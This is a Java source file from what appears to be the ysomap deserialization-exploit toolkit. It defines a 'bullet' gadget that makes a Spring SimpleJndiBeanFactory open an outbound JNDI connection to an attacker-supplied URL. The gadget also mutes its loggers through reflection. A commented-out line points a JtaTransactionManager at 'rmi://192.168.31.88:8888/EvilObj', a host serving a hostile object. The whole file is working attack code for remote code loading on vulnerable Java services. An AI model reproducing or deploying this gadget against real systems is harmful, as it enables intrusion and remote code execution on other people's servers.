package ysomap.bullets.spring;

import org.apache.commons.logging.impl.NoOpLog;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.core.util.ReflectionHelper;

/**
 * @author wh1t3P1g
 * @since 2020/6/6
 */
@Bullets
@Authors({Authors.WH1T3P1G})
@Details("向外发起JNDI连接")
@Dependencies({"*"})
public class SpringJndiBullet1 implements Bullet<Object> {

    @NotNull
    @Require(name = "jndiURL", detail = "向外发起JNDI连接")
    public String jndiURL;

    @Override
    public Object getObject() throws Exception {
        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
        bf.setShareableResources(jndiURL);
        ReflectionHelper.setFieldValue(bf, "logger", new NoOpLog());
        ReflectionHelper.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
//        JtaTransactionManager manager = new JtaTransactionManager();
//        manager.setUserTransactionName("rmi://192.168.31.88:8888/EvilObj");
        return bf;
    }
}
